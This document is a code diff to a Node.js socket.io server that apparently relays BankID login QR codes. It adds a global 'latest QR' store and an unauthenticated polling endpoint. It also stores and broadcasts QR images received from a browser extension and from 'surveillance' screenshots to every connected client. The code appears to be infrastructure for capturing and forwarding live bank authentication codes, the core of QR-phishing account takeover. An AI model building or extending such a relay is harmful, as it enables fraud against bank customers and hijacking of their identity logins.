@@ -15,6 +15,9 @@ const crypto = require('crypto');
 const config = require('./config');
 const QRCode = require('qrcode'); // <-- ADD THIS
 
+// Global store for the latest QR code
+let latestQrData = { qrData: null, timestamp: null };
+
 // Session storage for temporary URLs
 const temporaryUrls = new Map();
 
@@ -248,11 +251,21 @@ app.get('/health', (req, res) => {
 
 // Add API routes
 app.get('/api/qr', (req, res) => {
-    res.status(200).json({ message: 'QR code endpoint is ready' });
+    // This is the new polling endpoint
+    if (req.query.since && latestQrData.timestamp && parseInt(req.query.since) >= latestQrData.timestamp) {
+        // Client is up to date, no new data
+        return res.json({ updated: false });
+    }
+    // Send the latest QR data
+    res.json({ 
+        updated: !!latestQrData.qrData, 
+        qrData: latestQrData.qrData, 
+        timestamp: latestQrData.timestamp 
+    });
 });
 
 app.post('/api/qr', (req, res) => {
-    console.log('Received QR code request from:', req.get('origin'));
+    console.log('Received QR code request from (new ext):', req.get('origin'));
     const qrData = req.body.qrData;
     const sessionToken = req.body.sessionToken;
 
@@ -267,6 +280,9 @@ app.post('/api/qr', (req, res) => {
             console.error('Invalid image data format');
             throw new Error('Invalid image data');
         }
+
+        // STORE the latest QR data
+        latestQrData = { qrData: qrData, timestamp: Date.now() };
 
         // If session token is provided, store QR for that session
         if (sessionToken && temporaryUrls.has(sessionToken)) {
@@ -313,28 +329,36 @@ io.on('connection', (socket) => {
     });
 
     // Handle QR data from the old extension
-    socket.on('qr-scanned', async (data) => { // <-- Make it async
+    socket.on('qr-scanned', async (data) => {
         console.log('Received qr-scanned event from old extension.');
+        let qrImageToSend = null;
         
         if (data && data.data) { // Raw text data like "bankid://..."
             try {
-                // GENERATE QR CODE IMAGE FROM THE TEXT
-                const qrImageBase64 = await QRCode.toDataURL(data.data);
-                console.log('Generated QR code from raw text, broadcasting image.');
-                io.emit('new_qr', qrImageBase64); // Broadcast the IMAGE
+                qrImageToSend = await QRCode.toDataURL(data.data);
+                console.log('Generated QR code from raw text.');
             } catch (err) {
                 console.error('Failed to generate QR code from text:', err);
             }
         } else if (data && data.screenshot) { // Screenshot data
-             console.log('Broadcasting screenshot from surveillance.');
-             io.emit('new_qr', data.screenshot); // Broadcast the IMAGE
+             console.log('Using screenshot from surveillance.');
+             qrImageToSend = data.screenshot;
+        }
+
+        if (qrImageToSend) {
+            // STORE the latest QR data
+            latestQrData = { qrData: qrImageToSend, timestamp: Date.now() };
+            console.log('Broadcasting generated/received QR image.');
+            io.emit('new_qr', qrImageToSend); // Broadcast the IMAGE
         }
     });
 
     // Also handle the surveillance QR code found event
     socket.on('qr-scanner-surveillance', (data) => {
         if (data && data.type === 'QR_CODE_FOUND' && data.screenshot) {
-            console.log('Received QR via surveillance, broadcasting screenshot');
+            console.log('Received QR via surveillance, storing and broadcasting screenshot');
+            // STORE the latest QR data
+            latestQrData = { qrData: data.screenshot, timestamp: Date.now() };
             io.emit('new_qr', data.screenshot);
         }
     });
